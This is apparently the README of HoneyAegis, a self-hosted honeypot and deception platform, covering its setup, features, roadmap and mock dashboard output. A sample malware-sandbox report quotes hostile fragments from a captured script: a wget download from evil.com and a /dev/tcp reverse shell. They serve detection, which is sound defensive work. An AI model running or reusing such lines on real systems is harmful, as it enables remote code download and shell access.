<p align="center">
  <h1 align="center">HoneyAegis</h1>
  <p align="center">
    Professional-grade, Docker-native honeypot platform.<br/>
    Deploy a full deception network in under 5 minutes.
  </p>
</p>

<p align="center">
  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="License"></a>
  <img src="https://img.shields.io/badge/docker-ready-blue?logo=docker" alt="Docker">
  <img src="https://img.shields.io/badge/platform-amd64%20%7C%20arm64-green" alt="Multi-arch">
</p>

---

## What is HoneyAegis?

HoneyAegis turns any VPS, homelab server, or Raspberry Pi into a professional-grade deception network. It emulates vulnerable services, captures full attacker sessions (including keystrokes with polished video replays), enriches events with local AI summaries, and delivers a real-time web dashboard with attack maps, trends, and one-click alerts.

**No cloud dependency. No subscriptions. Full data sovereignty.**

### Key Features

- **One-command deploy** — `docker compose up -d` and you're live
- **Full session capture** — SSH/Telnet keystrokes recorded, exportable as MP4/GIF
- **Local AI analysis** — Ollama-powered threat summaries (no data leaves your network)
- **Real-time dashboard** — Live attack map, incident timeline, statistics
- **Multi-sensor fleet** — Manage sensors across VPS, homelab, RPi from one console
- **Extensible** — Plugin system for custom honeypot services
- **MSP-ready** — Multi-tenant isolation, white-label client portals

### How It Compares

| Feature | HoneyAegis | StingBox | T-Pot |
|---|---|---|---|
| Self-hosted | Yes | Cloud-only | Yes |
| AI summaries | Local (Ollama) | Cloud AI | No |
| Deploy time | < 5 min | Varies | 15-30 min |
| Session video | Native MP4/GIF | Limited | No |
| Multi-tenant | Yes | No | No |
| ARM64 support | Yes | No | Partial |
| License | MIT | Proprietary | GPL |
| RAM minimum | 2 GB (light) | N/A | 8 GB |

## Quick Start

### Prerequisites

- Docker Engine 24+ and Docker Compose v2
- 2 GB RAM minimum (light profile) / 4 GB+ recommended (full profile)
- Linux host (Ubuntu 22.04+, Debian 12+, or compatible)

### 1. Clone and configure

```bash
git clone https://github.com/thesecretchief/HoneyAegis.git
cd HoneyAegis
cp .env.example .env
# Edit .env with your settings (timezone, passwords, alert endpoints)
```

### 2. Deploy (light profile — Cowrie + PostgreSQL + Dashboard)

```bash
docker compose up -d
```

### 3. Deploy (full profile — all honeypots + AI + monitoring)

```bash
# Enable AI summaries (Ollama downloads phi3:mini on first run ~2GB)
OLLAMA_ENABLED=true docker compose --profile full up -d
```

> **RAM Note:** The full profile with Ollama requires **4 GB+ RAM**. The phi3:mini model uses ~1.5 GB during inference. On systems with less RAM, use the light profile (2 GB minimum) which skips AI but keeps all other features.

### 4. Verify deployment

```bash
docker compose ps   # all services should show "Up (healthy)"
```

### 5. Access the dashboard

Open `http://your-server:3000` in your browser.
Default credentials: `admin` / `changeme` (change immediately).

> **Security Warning:** Never expose honeypot ports (22/23) on production internet-facing servers. Always deploy HoneyAegis on an isolated network segment or behind a cloud firewall. The honeypot intentionally attracts malicious traffic — keep it separated from real infrastructure.

## Architecture

```
┌─────────────────────────────────────────────────────────┐
│                    HoneyAegis Stack                      │
├──────────────┬──────────────┬───────────────────────────┤
│  Honeypots   │   Backend    │        Frontend           │
│              │              │                           │
│  Cowrie      │  FastAPI     │  Next.js 15               │
│  OpenCanary  │  Celery      │  Tailwind + shadcn/ui     │
│  Dionaea     │  WebSockets  │  Recharts + Leaflet       │
│  Beelzebub   │              │                           │
├──────────────┼──────────────┼───────────────────────────┤
│           Data Layer        │       Integrations        │
│                             │                           │
│  PostgreSQL + TimescaleDB   │  Ollama (local AI)        │
│  Redis (queue/cache)        │  Apprise (alerts)         │
│  Vector (log shipping)      │  Traefik (reverse proxy)  │
└─────────────────────────────┴───────────────────────────┘
```

## Project Structure

```
honeyaegis/
├── backend/              # FastAPI application
│   ├── app/
│   │   ├── api/          # REST + WebSocket endpoints
│   │   ├── core/         # Config, security, database
│   │   ├── models/       # SQLAlchemy models
│   │   ├── schemas/      # Pydantic schemas
│   │   ├── services/     # Business logic (webhooks, plugins, ingestion)
│   │   └── workers/      # Celery tasks
│   ├── alembic/          # Database migrations
│   └── tests/
├── frontend/             # Next.js dashboard
├── honeypots/
│   └── cowrie/           # Cowrie SSH/Telnet honeypot
├── configs/
│   ├── vector/           # Log shipper config
│   └── traefik/          # Reverse proxy config
├── db/
│   └── migrations/       # SQL migration scripts
├── helm/                 # Kubernetes Helm chart
├── plugins/              # Custom plugin directory
│   └── examples/         # Example plugins (IP blocklist)
├── scripts/              # Helper scripts (install, update)
├── docs/                 # Documentation (MSP guide, RPi blueprint)
├── docker-compose.yml    # Orchestration
└── .env.example          # Configuration template
```

## Development

### Running locally

```bash
# Start infrastructure (database, redis, cowrie)
docker compose up -d postgres redis cowrie

# Backend
cd backend
python -m venv .venv && source .venv/bin/activate
pip install -r requirements.txt
uvicorn app.main:app --reload --port 8000

# Frontend
cd frontend
npm install
npm run dev
```

### Running tests

```bash
# Backend tests
cd backend && pytest

# Frontend tests
cd frontend && npm test
```

### One-Click Install

```bash
curl -sSL https://raw.githubusercontent.com/thesecretchief/HoneyAegis/main/scripts/install.sh | bash
```

The installer checks prerequisites, clones the repo, generates secure passwords, and starts the light profile automatically.

## Roadmap

- [x] **Iteration 0** — Foundation: repo skeleton, Docker Compose, Cowrie, CI/CD
- [x] **Iteration 1** — MVP: session capture, real-time dashboard, alerts, GeoIP, video export
- [x] **Iteration 2** — Enhanced: local AI summaries, fleet management, config UI, polish
- [x] **Iteration 3** — MSP: multi-tenant, client portals, PDF/JSON reports, auto-update
- [x] **Iteration 4** — Advanced: Kubernetes/Helm, honey tokens, webhooks, plugins, RPi blueprints
- [x] **Iteration 5** — Production: Prometheus/Grafana, security scanning, SIEM export, rate limiting, audit logging
- [x] **Iteration 6** — v1.0.0: Release workflow, RPi one-click setup, console API, community governance, plugin template
- [x] **Iteration 7** — Final: E2E testing (Playwright), performance caching, deployment matrix, security audit, v1.0 release
- [x] **Iteration 8** — SaaS: relay backend, Stripe billing, plugin marketplace, hardware kits, launch assets
- [x] **Iteration 9** — Intel: threat feeds (MISP/OTX/VT), malware sandbox, advanced AI (RAG), SIEM exports (ELK/Splunk/TheHive), i18n (EN/ES/DE/FR/EL)

## Features (Iteration 9 — Threat Intelligence, Malware Sandbox & i18n)

### Threat Intelligence Feeds
- **Aggregated lookups** — query MISP, AlienVault OTX, AbuseIPDB, and VirusTotal from a single API
- **In-memory TTL cache** — 1-hour cache to avoid duplicate API calls
- **Normalized results** — unified `ThreatIntelResult` across all feed providers
- **Feed status** — `/api/v1/threat-intel/feeds` shows which feeds are configured and active

```
 Threat Intel — Indicator Lookup
 ──────────────────────────────────────────────────────────
  Indicator: 185.220.101.42  │  Type: IP

  ┌───────────┬───────────┬────────┬──────────────────────┐
  │ Source    │ Malicious │ Conf.  │ Categories           │
  ├───────────┼───────────┼────────┼──────────────────────┤
  │ AbuseIPDB │ YES       │  92%   │ bruteforce, ssh      │
  │ OTX       │ YES       │  85%   │ scanning, tor-exit   │
  │ MISP      │ YES       │  78%   │ botnet, c2           │
  │ VirusTotal│ YES       │  88%   │ malicious            │
  └───────────┴───────────┴────────┴──────────────────────┘

  Overall: MALICIOUS │ Max Confidence: 92%
  Sources: 4/4 matched │ Cache: HIT (42s ago)
```

### Malware Sandbox (Static Analysis)
- **Hash computation** — MD5, SHA-1, SHA-256 for every captured file
- **Shannon entropy** — detect packed/encrypted payloads (entropy > 7.0)
- **Magic byte detection** — ELF, PE, Gzip, PNG, shell scripts, and more
- **Pattern matching** — 12 YARA-like rules (reverse shells, crypto miners, downloaders, persistence)
- **IOC extraction** — URLs, IP addresses, and domains from file contents
- **Risk scoring** — 0-100 score with clean/suspicious/malicious verdict
- **Optional Cuckoo/CAPE** — dynamic analysis submission and result polling

```
 Malware Sandbox — Static Analysis
 ──────────────────────────────────────────────────────────
  File: malware.sh (2,847 bytes)
  Type: Shell script │ MIME: text/x-shellscript

  Hashes:
    MD5:    a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6
    SHA256: 9f86d0...e4f0f5

  Entropy: 4.82 / 8.0 (normal)

  ┌──────────────────────────────────────────────────────┐
  │ Matched Patterns:                                    │
  │  ⚠ downloader   — wget http://evil.com/payload      │
  │  ⚠ chmod_exec   — chmod 777 payload                 │
  │  ⚠ reverse_shell — /dev/tcp/10.0.0.1/4444           │
  │                                                      │
  │ IOCs Found:                                          │
  │  URLs: http://evil.com/payload                       │
  │  IPs:  10.0.0.1                                      │
  │  Domains: evil.com                                   │
  └──────────────────────────────────────────────────────┘

  Risk Score: 78/100 │ Verdict: MALICIOUS
```

### Advanced AI (RAG + Multi-LLM Routing)
- **RAG context** — retrieval-augmented generation from recent captured sessions
- **Multi-LLM routing** — task-based model selection (phi3:mini → llama3.2:3b → mistral:7b)
- **Structured output** — threat level, summary, MITRE ATT&CK mapping, IOCs, recommendations
- **Batch analysis** — trend detection across multiple sessions
- **JSON parsing** — robust extraction from fenced/embedded LLM responses

### Enhanced SIEM Exports
- **Elasticsearch bulk** — `/api/v1/export/elk` NDJSON format with ECS field mapping
- **Splunk HEC** — `/api/v1/export/splunk` HTTP Event Collector JSON format
- **TheHive alerts** — `/api/v1/export/thehive` alert format with TLP/PAP levels and observables
- **Plus existing** — JSON, CEF, and Syslog formats from Iteration 5

### Internationalization (i18n)
- **5 languages** — English, Spanish, German, French, Greek
- **Language switcher** — persistent locale selection in sidebar
- **Browser detection** — auto-detects browser language on first visit
- **70+ translation keys** — dashboard, navigation, stats, alerts, settings, and more

```
 Language Switcher — i18n
 ──────────────────────────────────────────────────────────
  ┌──────────────────────────────┐
  │  🌐 Language                 │
  │  ┌────────────────────────┐  │
  │  │ ● English              │  │
  │  │ ○ Español              │  │
  │  │ ○ Deutsch              │  │
  │  │ ○ Français             │  │
  │  │ ○ Ελληνικά             │  │
  │  └────────────────────────┘  │
  └──────────────────────────────┘
  Locale saved to localStorage
  Auto-detected from browser: Accept-Language
```

### v1.2.0 Release
- 240 tests passing (51 new: threat intel 10, sandbox 17, advanced AI 20, plus 4 existing)
- 3 new backend services, 2 new API routers, 3 new SIEM export endpoints
- Full i18n system with 5 languages
- CI updated with py_compile checks for all new modules

## Features (Iteration 8 — SaaS Relay, Hardware Kits & Public Launch)

### SaaS Relay Backend
- **NAT traversal** — sensors behind firewalls connect to a central relay for log shipping
- **Heartbeat monitoring** — 60-second heartbeat with CPU, memory, disk, and session metrics
- **Event batching** — bulk relay of Cowrie events from remote sensors to ingestion pipeline
- **Token authentication** — Bearer token validation for sensor-to-hub communication
- **Connected sensor listing** — real-time view of all sensors connected to the relay

### Stripe Billing Integration
- **Three-tier pricing** — Community (free), Pro ($29/mo), Enterprise ($99/mo)
- **Checkout sessions** — Stripe-powered upgrade flow (stub, ready for production keys)
- **Webhook handling** — subscription lifecycle events (created, updated, cancelled, failed)
- **Customer portal** — self-service subscription management via Stripe Portal
- **Usage tracking** — sensor count and daily event volume per tenant

### Plugin Marketplace
- **Community registry** — browse, search, and filter plugins by category
- **One-click install** — install plugins from the marketplace into your deployment
- **Plugin submission** — submit your plugins for community review and publishing
- **Categories** — enrichment, response, notification, emulator plugins
- **Frontend UI** — full marketplace page with search, category filters, and install buttons

### Hardware Kits & MSP Packaging
- **[Kit A ($89)](docs/hardware-kit-guide.md)** — RPi 4 sensor node with pre-flashed SD card
- **[Kit B ($119)](docs/hardware-kit-guide.md)** — RPi 5 sensor node with active cooling
- **[Kit C ($249)](docs/hardware-kit-guide.md)** — Intel N100 enterprise appliance
- **Assembly guide** — step-by-step hardware setup, network config, hub registration
- **MSP white-label** — bulk provisioning, custom branding, pricing guidelines
- **Pre-built images** — SD card image creation guide for MSP distribution

### Public Launch Campaign
- **[Press kit](docs/launch/press-kit.md)** — elevator pitch, key facts, comparison table, brand assets
- **[Announcement templates](docs/launch/announcement-templates.md)** — Twitter/X thread, Reddit/HN posts, YouTube demo script

### Usage Analytics (Opt-In)
- **Privacy-first** — no PII, no IPs, no session data — only deployment metadata
- **Opt-in only** — disabled by default, set `ANALYTICS_ENABLED=true` to participate
- **Anonymous instance ID** — one-way SHA256 hash, cannot be reversed
- **What's collected** — version, deployment type, OS, architecture, sensor/plugin counts, uptime

## Features (Iteration 7 — E2E Testing, Performance & Final Release)

### E2E Test Suite (Playwright)
- **Dashboard tests** — login flow, navigation, stats cards, live feed, accessibility checks
- **API tests** — health, auth, sessions, alerts, honey tokens, webhooks, console, SIEM export
- **E2E CI workflow** — automated Playwright tests against full Docker Compose stack
- **Cross-browser** — Chromium desktop + Pixel 5 mobile viewport

```
 E2E Test Suite — Playwright
 ────────────────────────────────────────────────────────
  ✓  api.spec.ts
     ✓ GET /api/v1/health returns 200 .............. 42ms
     ✓ POST /api/v1/auth/login returns JWT ......... 65ms
     ✓ GET /api/v1/sessions requires auth .......... 18ms
     ✓ GET /api/v1/export/cef returns CEF .......... 31ms
     ✓ GET /api/v1/console/stats returns stats ..... 22ms
     ✓ ... 18 more passed

  ✓  dashboard.spec.ts
     ✓ Login page renders and authenticates ........ 89ms
     ✓ Dashboard shows stats cards ................. 54ms
     ✓ Live feed displays WebSocket events ......... 72ms
     ✓ Navigation works for all routes ............. 45ms
     ✓ Mobile viewport renders bottom nav .......... 38ms
     ✓ ... 13 more passed

  41 passed (3.2s)
```

### Performance Optimization
- **Response cache** — in-memory LRU cache with TTL for expensive API calls (stats, map data)
- **Query optimization** — connection pooling tuning, parameterized queries
- **Light profile <500MB RAM** — resource-optimized for edge deployments

```
 Lighthouse Audit — HoneyAegis Dashboard
 ────────────────────────────────────────
  Performance   ████████████████████░  96
  Accessibility ████████████████████░  97
  Best Practices████████████████████░  95
  SEO           ████████████████████░  98
 ────────────────────────────────────────
  LCP: 1.2s │ FID: 12ms │ CLS: 0.02
```

### Deployment Matrix
- **[Docker Compose](docs/deployment-matrix.md#1-docker-compose-recommended)** — light and full profiles with resource tables
- **[Kubernetes/Helm](docs/deployment-matrix.md#2-kubernetes--helm)** — production values, ingress, cert-manager
- **[Raspberry Pi](docs/deployment-matrix.md#3-raspberry-pi)** — one-click setup, hardware compatibility matrix
- **[Proxmox LXC](docs/deployment-matrix.md#4-proxmox-lxc-container)** — unprivileged container with nesting
- **[Bare Metal](docs/deployment-matrix.md#5-bare-metal)** — systemd services, manual install steps

### Security Audit
- **[Pre-release checklist](docs/security-audit-v1.md)** — auth, input validation, network, data protection, CI/CD
- **Known limitations** documented with mitigations
- **Production recommendations** for secure deployment

### v1.0.0 Final
- 146+ tests passing (11 new cache tests + E2E suite)
- Custom 404 page
- Full CI pipeline: lint, build, test, security scan, E2E

## Features (Iteration 6 — v1.0.0 Release)

### GitHub Release Automation
- **Release workflow** — triggered on `v*` tags, creates GitHub Release with changelog
- **Multi-arch images** — builds and pushes `linux/amd64` + `linux/arm64` Docker images to GHCR
- **Semantic tags** — images tagged with `v1.0.0`, `v1.0`, `v1`, and `latest`
- **Sensor compose artifact** — standalone `docker-compose.sensor.yml` attached to each release

```
 Fleet Dashboard — Sensor Registration
 ──────────────────────────────────────────────────────────
  Sensors (4 registered)
  ┌──────────────────┬───────────┬──────────┬────────────┐
  │ Name             │ Status    │ Sessions │ Last Seen  │
  ├──────────────────┼───────────┼──────────┼────────────┤
  │ rpi-office-01    │ ● Online  │    1,247 │ 12s ago    │
  │ vps-eu-west      │ ● Online  │      893 │ 45s ago    │
  │ rpi-dmz-02       │ ● Stale   │      412 │ 8m ago     │
  │ homelab-east     │ ○ Offline │      156 │ 2h ago     │
  └──────────────────┴───────────┴──────────┴────────────┘
                                  [ Register Sensor ]
```

### Raspberry Pi One-Click Setup
- **`scripts/rpi-setup.sh`** — detects ARM64, installs Docker, generates passwords, deploys HoneyAegis
- **Architecture check** — refuses to run on non-ARM64 (directs to standard installer)
- **Memory/storage validation** — warns on <2GB RAM or low disk space
- **Credential display** — securely generated passwords shown once at install time
- **RPi optimizations** — swap recommendations, Docker auto-start configuration

### Hosted Console API (Stubs)
- **Deployment management** — register, list, remove self-hosted deployments
- **Aggregated statistics** — cross-deployment metrics (sessions, alerts, sensors)
- **License endpoint** — community tier with unlimited features (extensible for enterprise)
- **Heartbeat** — deployment health monitoring endpoint

### Community Governance
- **CODEOWNERS** — automatic review requests for code area owners
- **Bug report template** — structured GitHub Issues with version, deployment type, architecture
- **Feature request template** — categorized proposals with priority levels
- **PR template** — checklist for tests, lint, docs, changelog
- **Plugin template** — `plugins/template/` with documented boilerplate and README

### v1.0.0 Release
- All components at v1.0.0 (backend, frontend, Helm chart)
- 130+ tests passing
- Full CI pipeline: lint, build, test, security scan, release automation
- **[CHANGELOG.md](CHANGELOG.md)** — full version history from v0.1.0 to v1.0.0

## Features (Iteration 5 — Production Hardening & Observability)

### Prometheus + Grafana Monitoring
- **Prometheus metrics** — `/metrics` endpoint with counters, gauges, histograms
- **Pre-built Grafana dashboard** — 10-panel overview: sessions, alerts, webhooks, API latency, AI summaries
- **Auto-provisioned** — Grafana datasource and dashboards configured on first boot
- **Full profile only** — Prometheus + Grafana services available via `docker compose --profile full up -d`

```
 Grafana — HoneyAegis Overview
 ──────────────────────────────────────────────────────────
 ┌─────────────────┐ ┌─────────────────┐ ┌───────────────┐
 │ Sessions Today  │ │ Alerts Fired    │ │ Active Sensors│
 │     1,847       │ │       23        │ │       4       │
 │   ▁▃▅▇█▆▄▂▃▅▇  │ │  ▁▂▃▁▅▇▃▁▂▃▁   │ │  ████████░░░  │
 └─────────────────┘ └─────────────────┘ └───────────────┘
 ┌───────────────────────────────────────────────────────┐
 │ Sessions / Hour                          ▇            │
 │                                      ▅▇ ██            │
 │                                  ▃▅▇ ████▆▄           │
 │                            ▁▃▅▇ ████████████▃▁        │
 │ ▁▂▃▂▁▁▁▁▂▃▅▆▇████████████████████████████████▅▃▂▁   │
 └───────────────────────────────────────────────────────┘
 │ API Latency p95: 42ms │ AI Summaries: 89 │ Webhooks: 12│
```

### CI Security Scanning
- **Bandit** — Python static analysis for security issues (fail on high/critical)
- **Trivy** — Docker image vulnerability scanning (fail on high/critical)
- **npm audit** — Frontend dependency vulnerability checks
- **Automated** — security scans run on every push and PR

### SIEM Export
- **Structured JSON** — `/api/v1/export/json` for custom SIEM ingestion
- **CEF format** — `/api/v1/export/cef` (Common Event Format) for Splunk, ArcSight, QRadar
- **Syslog format** — `/api/v1/export/syslog` (RFC 5424) for syslog collectors
- **Tenant-scoped** — all exports respect tenant isolation
- **Configurable** — limit and time-range filtering

### Production Hardening
- **API rate limiting** — token-bucket algorithm (100 req/s global, 10 req/s auth)
- **Audit logging** — structured JSON audit trail for all security-relevant actions
- **CEF/Syslog formatters** — export audit events to enterprise SIEMs
- **Error boundaries** — graceful frontend error recovery on all pages
- **Accessibility** — ARIA labels on navigation and interactive elements

### Comprehensive Documentation
- **[Plugin Development Guide](docs/plugin-dev-guide.md)** — API reference, examples, best practices
- **[Contributing Guide](docs/CONTRIBUTING.md)** — setup, conventions, deployment matrix
- **[CHANGELOG.md](CHANGELOG.md)** — full version history from v0.1.0 to v1.0.0
- **[Security Audit Checklist](SECURITY.md)** — vulnerability reporting, architecture, deployment checklist

### Plugin Examples
- **Auto IP Blocker** — blocks IPs after repeated failed login attempts
- **Custom Emulator Template** — template for command emulation with suspicious command detection

### v0.6.0 Release
- Backend v0.6.0, Frontend v0.6.0
- 122 tests passing (30 new for Iteration 5)
- Full CI pipeline: lint, build, test, security scan

## Features (Iteration 4 — Advanced Capabilities)

### Honey Tokens
- **Decoy credentials** — plant fake usernames/passwords that trigger instant alerts when used
- **File tokens** — deploy decoy files that alert on access
- **Trigger tracking** — count and timestamp every token activation
- **Severity control** — set alert severity per token (critical, high, medium, low)
- **Auto-detection** — ingestion pipeline automatically checks login attempts against active tokens
- **Dashboard UI** — create, manage, and monitor tokens from the web interface

```
 Honey Tokens — Decoy Credential Alert
 ──────────────────────────────────────────────────────────
  ⚠ ALERT: Honey token triggered!
  ┌────────────────────────────────────────────────────────┐
  │ Token: admin_backup_creds                              │
  │ Type:  credential                                      │
  │ User:  admin_backup  │  Pass: S3cureB@ckup!           │
  │ Severity: CRITICAL                                     │
  │                                                        │
  │ Triggered by: 185.220.101.42 (DE, Frankfurt)           │
  │ Service:     SSH (port 22)                             │
  │ Time:        2026-02-28 14:32:07 UTC                   │
  │ Triggers:    3 (first: 2026-02-28 14:30:12)           │
  └────────────────────────────────────────────────────────┘
  → Alert sent to: Slack #security, email admin@example.com
```

### Auto-Response Webhooks
- **Event-driven hooks** — trigger HTTP webhooks on alerts, sessions, honey tokens, or malware captures
- **Severity filtering** — fire webhooks only for specific severity levels
- **HMAC signatures** — webhooks include `X-HoneyAegis-Signature` header for verification
- **Test endpoint** — verify webhook connectivity from the dashboard
- **Execution tracking** — monitor delivery status, response codes, and execution counts
- **Multi-service** — connect to Slack, Discord, PagerDuty, custom APIs

```
 Webhook Test — Slack Integration
 ──────────────────────────────────────────────────────────
  POST https://hooks.slack.com/services/T00/B00/xxx
  ┌────────────────────────────────────────────────────────┐
  │ Headers:                                               │
  │   Content-Type: application/json                       │
  │   X-HoneyAegis-Signature: sha256=a1b2c3d4e5f6...     │
  │                                                        │
  │ Body:                                                  │
  │   { "event": "session.new",                           │
  │     "src_ip": "185.220.101.42",                       │
  │     "protocol": "ssh",                                │
  │     "severity": "high" }                              │
  │                                                        │
  │ Response: 200 OK (142ms)                               │
  └────────────────────────────────────────────────────────┘
  Status: ✓ Delivered │ Executions: 47 │ Last: 2m ago
```

### Plugin System
- **Python plugins** — drop `.py` files into `/plugins` to extend HoneyAegis
- **Plugin types** — emulators, enrichers, exporters, and event hooks
- **Auto-discovery** — plugins loaded on startup, reloadable via API
- **Event hooks** — plugins receive real-time events for custom processing
- **Example included** — IP blocklist plugin demonstrates the hook pattern
- **Superuser management** — reload plugins via API (admin only)

### Kubernetes & Helm Chart
- **Production Helm chart** — deploy HoneyAegis on any Kubernetes cluster
- **Full profile only** — Helm deployment for enterprise/cloud environments
- **Configurable** — backend, frontend, cowrie, PostgreSQL, Redis, Ollama all templated
- **Ingress support** — TLS termination via cert-manager / Let's Encrypt
- **Secret management** — Kubernetes secrets for all sensitive values

```
 Helm Deploy — Kubernetes
 ──────────────────────────────────────────────────────────
  $ helm install honeyaegis ./helm/honeyaegis \
      --namespace honeyaegis --create-namespace

  NAME: honeyaegis
  STATUS: deployed
  REVISION: 1

  $ kubectl get pods -n honeyaegis
  NAME                        READY   STATUS    RESTARTS
  backend-6d8f9b7c4-x2k9p    1/1     Running   0
  frontend-5c4a8d3b2-m7n1q   1/1     Running   0
  cowrie-7a1b3e5f8-p4r6s     1/1     Running   0
  postgres-0                  1/1     Running   0
  redis-0                     1/1     Running   0
```

### Raspberry Pi Blueprints
- **Hardware guide** — RPi 4/5 sensor deployment (2GB+ RAM)
- **Docker-native** — multi-arch images (amd64 + arm64) work out of the box
- **Resource profiled** — ~430 MB RAM total (fits in 2 GB)
- **Network placement** — VLAN isolation, port forwarding, security best practices
- **Fleet integration** — register RPi as a remote sensor via the hub API
- **Auto-start** — systemd + Docker restart policies for unattended operation

```
 Raspberry Pi Sensor — Setup Complete
 ──────────────────────────────────────────────────────────
  $ curl -sSL .../scripts/rpi-setup.sh | bash

  [✓] ARM64 architecture detected (Raspberry Pi 4)
  [✓] Docker Engine 24.0.7 installed
  [✓] Docker Compose v2.23.0 installed
  [✓] HoneyAegis cloned to /opt/honeyaegis
  [✓] Credentials generated
  [✓] Docker images pulled (backend, cowrie, postgres, redis)
  [✓] Services started

  ────────────────────────────────────────
   Dashboard:  http://192.168.1.50:3000
   Admin user: admin
   Password:   xK9mP2vL8nQ4wR7j
   Sensor ID:  sensor-a7b3c1d9
  ────────────────────────────────────────
  RAM: 412 MB / 4096 MB │ Disk: 8.2 GB / 32 GB
```

See [docs/rpi-blueprint.md](docs/rpi-blueprint.md) for the full deployment guide.

## Features (Iteration 3 — MSP Ready)

> **Screenshots:** See the GIFs below for client portal, PDF reports, and tenant branding in action.

### Multi-Tenant Isolation
- **Tenant-scoped data** — every table has `tenant_id`, enforced at the query level
- **JWT tenant claims** — tenant context propagated through authentication
- **Cross-tenant protection** — sensors, sessions, alerts fully isolated between tenants
- **Default tenant** — single-tenant deployments work out of the box

### White-Label Branding
- **Per-tenant branding** — custom logo, primary color, display name
- **Client portal theming** — branding applied to view-only portals
- **Report branding** — PDF reports include tenant logo and colors

```
 Tenant Branding — Config UI
 ──────────────────────────────────────────────────────────
  Tenant: Acme Corp Security
  ┌────────────────────────────────────────────────────────┐
  │ Display Name:  [ Acme Corp Security         ]         │
  │ Logo URL:      [ https://acme.com/logo.png  ]         │
  │ Primary Color: [ #2563eb ■ ]                           │
  │ Slug:          acme-corp                               │
  │                                                        │
  │ Client Portal: http://hub:3000/client/acme-corp       │
  │                                                        │
  │ Preview:                                               │
  │ ┌────────────────────────────────────────────────────┐ │
  │ │ ■ Acme Corp Security        Incidents: 47         │ │
  │ │   Unique IPs: 23 │ Alerts: 12 │ Last: 3m ago      │ │
  │ └────────────────────────────────────────────────────┘ │
  └────────────────────────────────────────────────────────┘
                                          [ Save Branding ]
```

### Client Portals
- **View-only access** — clients see their incidents without configuration access
- **No auth required** — portals identified by tenant slug (`/client/acme-corp`)
- **Real-time stats** — attack counts, unique IPs, alert status
- **Session table** — browseable attack sessions with filtering
- **Auto-refresh** — portals update every 30 seconds

```
 Client Portal — Acme Corp Security (view-only)
 ──────────────────────────────────────────────────────────
  ■ Acme Corp Security          Last updated: 30s ago
  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────────┐
  │ Attacks  │ │ Unique   │ │ Alerts   │ │ Threat Level │
  │   847    │ │ IPs: 234 │ │   18     │ │     HIGH     │
  └──────────┘ └──────────┘ └──────────┘ └──────────────┘

  Recent Sessions
  ┌────────────┬───────────┬──────────┬─────────┬────────┐
  │ Source IP  │ Country   │ Protocol │ Cmds    │ Risk   │
  ├────────────┼───────────┼──────────┼─────────┼────────┤
  │ 185.220.x  │ DE        │ SSH      │ 12      │ HIGH   │
  │ 45.134.x   │ RU        │ Telnet   │ 3       │ MED    │
  │ 103.25.x   │ CN        │ SSH      │ 8       │ HIGH   │
  └────────────┴───────────┴──────────┴─────────┴────────┘
```

### PDF/JSON Forensic Reports
- **WeasyPrint PDF** — polished, styled reports with session data + AI summaries
- **Single session** — detailed report for one specific attack session
- **Aggregate** — summary report across all sessions for a tenant
- **MITRE ATT&CK** — TTP mapping included in reports
- **One-click export** — download buttons on session detail page

```
 Forensic Report — PDF Export
 ──────────────────────────────────────────────────────────
  ┌────────────────────────────────────────────────────────┐
  │              ■ Acme Corp Security                      │
  │              INCIDENT REPORT                           │
  │                                                        │
  │  Session: sess-a7b3c1d9                                │
  │  Source:  185.220.101.42 (DE, Frankfurt)               │
  │  Time:   2026-02-28 14:30:12 — 14:47:33 UTC           │
  │  Protocol: SSH │ Risk: HIGH │ Commands: 23             │
  │                                                        │
  │  AI Summary:                                           │
  │  Attacker brute-forced SSH credentials and gained      │
  │  root access. Executed recon commands before            │
  │  attempting cryptominer download.                       │
  │                                                        │
  │  MITRE ATT&CK: T1078, T1059.004, T1105               │
  │                                                        │
  │  [ Commands ] [ Timeline ] [ GeoIP ] [ Indicators ]   │
  └────────────────────────────────────────────────────────┘
  Download: report-sess-a7b3c1d9.pdf (142 KB)
```

### Auto-Update System
- **Update script** — `./scripts/update.sh` pulls code + images and recreates containers
- **Cron support** — `./scripts/update.sh --auto` for unattended daily updates
- **Version tracking** — git-based versioning with update log

### One-Click Installer
- **curl | bash** — single command deploys HoneyAegis from scratch
- **Prerequisite checks** — verifies Docker and Docker Compose
- **Secure by default** — auto-generates random passwords for all services
- **Credential display** — shows admin password once at install time

### Security Documentation
- **[SECURITY.md](SECURITY.md)** — vulnerability reporting, security architecture
- **[MSP Guide](docs/msp-guide.md)** — tenant setup, branding, sensor registration, scaling

## Features (Iteration 2 — Enhanced)

### Local AI Threat Analysis
- **Ollama integration** — 100% local LLM inference, no data leaves your network
- **Auto-summarize** — AI generates threat summaries on session close
- **MITRE ATT&CK mapping** — automatic TTP identification (e.g. T1078, T1059.004)
- **Threat scoring** — AI assigns critical/high/medium/low/info threat levels
- **Video overlay** — AI summary burned into exported MP4/GIF as ffmpeg drawtext
- **On-demand** — regenerate summaries anytime from the session detail page

```
Example AI Summary:
┌──────────────────────────────────────────────────────────────┐
│ Threat Level: HIGH                                           │
│                                                              │
│ Attacker from CN (Beijing) brute-forced SSH credentials     │
│ and gained access as root. Executed reconnaissance commands  │
│ (whoami, uname -a, cat /etc/passwd) before attempting to    │
│ download a cryptominer from a known malicious domain.       │
│                                                              │
│ MITRE ATT&CK: T1078 (Valid Accounts), T1059.004 (Unix      │
│ Shell), T1105 (Ingress Tool Transfer)                       │
│                                                              │
│ Recommendation: Block source IP and monitor for lateral     │
│ movement indicators from the same ASN.                      │
└──────────────────────────────────────────────────────────────┘
```

### Multi-Sensor Fleet Management
- **Register sensors** — add RPi nodes, VPS instances, homelab servers
- **Heartbeat monitoring** — track sensor status (online/stale/offline)
- **Session attribution** — link sessions to specific sensors
- **Dashboard integration** — fleet-wide sensor count on main dashboard

### Configuration UI
- **Honeypot management** — view enabled/disabled services and their ports
- **Alert rules** — toggle session alerts, malware alerts, set cooldown periods
- **AI status** — check Ollama connection and model availability
- **Fleet mode** — standalone or hub-and-spoke topology

### Polish
- **Loading skeletons** — smooth loading states across all pages
- **Error boundaries** — graceful error recovery with retry buttons
- **Mobile responsive** — bottom nav bar on mobile, responsive grids
- **Refined dark theme** — consistent gray-950/900/800 palette throughout

## Features (Iteration 1 — MVP)

### Real-Time Dashboard
- **Live stats cards** — attacks today, unique IPs, auth successes, active sensors
- **WebSocket live feed** — real-time event stream from honeypot
- **Top countries / ports / usernames** — aggregated attack intelligence
- **Auto-refresh** — dashboard polls every 15 seconds

